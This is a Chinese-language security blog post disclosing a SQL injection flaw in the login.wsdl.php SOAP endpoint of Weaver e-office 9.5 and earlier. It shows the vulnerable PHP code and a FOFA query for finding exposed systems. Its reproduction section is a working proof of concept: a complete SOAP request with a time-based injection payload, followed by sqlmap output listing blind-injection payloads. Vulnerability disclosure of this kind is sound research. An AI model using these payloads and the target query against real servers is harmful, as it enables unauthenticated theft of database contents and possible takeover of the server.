---
title: "泛微e-office login.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-login-wsdl-sqli.html
asset_dir: assets/泛微e-office-login.wsdl.php-sql注入漏洞
---

# 泛微e-office login.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/21 08:29
* 879浏览
* [0评论](#comment)
* 39分钟阅读

深入探索

软件

应用程序

Microsoft Office


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office login.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

同样通过解析 wsdl 后有很多功能

深入探索

鉴权

身份验证

编程语言教程

[![泛微e-office login.wsdl.php sql注入漏洞](images/img-001-77d89be558ce.webp)](https://image.mrxn.net/089f781d1d3b462f8092c26bda4b5f71.webp)

[webservice](#)-json/login/login.wsdl.php 的 `UserLogin` 业务逻辑如下

编程

```
function UserLogin( $UserName, $Password )
{
    $loginStatus = array( );
    if ( trim( $UserName ) == "" )
    {
        $loginStatus['status'] = "false";
        $loginStatus['infor'] = "用户名为空";
        return $loginStatus;
    }
    $user = new user( );
    if ( $user->CheckUserAccount( $UserName ) == false )
    {
        $loginStatus['status'] = "false";
        $loginStatus['infor'] = "用户名不存在";
        return $loginStatus;
    }
    $userID = $user->getUserIDByUserAccount( $UserName );
```

`$UserName` 首先带入 `CheckUserAccount` 函数

```
public function CheckUserAccount( $userAccount )
{
  global $connection;
  if ( trim( $userAccount ) == "" )
  {
    return false;
  }
  $sql = "SELECT COUNT(*) AS cnt FROM user WHERE USER_ACCOUNTS='".$userAccount."'";
  $rs = exequery( $connection, $sql );
  $row = mysql_fetch_array( $rs );
```

`$userAccount` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /webservice-json/login/login.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:LoginServicewsdl#UserLogin
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:UserLogin soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserName xsi:type="xsd:string">gero' AND 8955=BENCHMARK(5000000,MD5(0x78514279))-- rPQC</UserName>
         <Password xsi:type="xsd:string">sonoras imperio</Password>
      </urn:UserLogin>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office login.wsdl.php sql注入漏洞](images/img-002-f5b86ee4db41.webp)](https://image.mrxn.net/ef65f87832c94e2e9ec941c801e77e12.webp)

成功在延时 5 秒

代码安全审计

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 418 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:UserLogin soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserName xsi:type="xsd:string">gero' RLIKE (SELECT (CASE WHEN (5168=5168) THEN 0x6765726f ELSE 0x28 END))-- JQeZ</UserName>
         <Password xsi:type="xsd:string">sonoras imperio</Password>
      </urn:UserLogin>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:UserLogin soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserName xsi:type="xsd:string">gero' AND 8955=BENCHMARK(5000000,MD5(0x78514279))-- rPQC</UserName>
         <Password xsi:type="xsd:string">sonoras imperio</Password>
      </urn:UserLogin>
   </soapenv:Body>
</soapenv:Envelope>
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office login.wsdl.php sql注入漏洞](https://mrxn.net/jswz/eoffice-webservice-json-login-wsdl-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-webservice-json-login-wsdl-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞扫描服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-login-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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